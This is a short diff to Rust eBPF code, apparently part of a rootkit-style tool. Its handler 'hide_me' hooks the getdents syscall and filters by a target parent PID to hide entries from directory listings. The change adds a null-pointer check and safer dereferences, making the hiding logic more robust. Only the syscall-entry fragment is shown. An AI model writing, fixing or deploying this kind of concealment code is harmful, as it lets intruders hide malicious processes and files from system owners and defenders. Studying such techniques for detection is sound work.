@@ -36,10 +36,14 @@ pub fn hide_me(ctx: TracePointContext) -> u32 {
 }
 
 fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
-    let the_target_ppid = unsafe { target_ppid.get(&0).unwrap() };
+    let the_target_ppid = unsafe { target_ppid.get(&0).unwrap() as *const i32 };
     let pid_tgid = bpf_get_current_pid_tgid();
 
-    if *the_target_ppid != 0 {
+    if the_target_ppid.is_null() {
+        return Err(0);
+    }
+
+    if unsafe { *the_target_ppid } != 0 {
         let ppid = unsafe {
             let task = bpf_get_current_task() as *const task_struct;
 
@@ -50,10 +54,10 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
             bpf_probe_read_kernel::<i32>(
                 (real_parent.unwrap() as usize + offset_of!(task_struct, tgid)) as *const i32,
             )
-            .unwrap()
+                .unwrap()
         };
 
-        if ppid != *the_target_ppid {
+        if ppid != unsafe { *the_target_ppid } {
             return Ok(0);
         }
     }
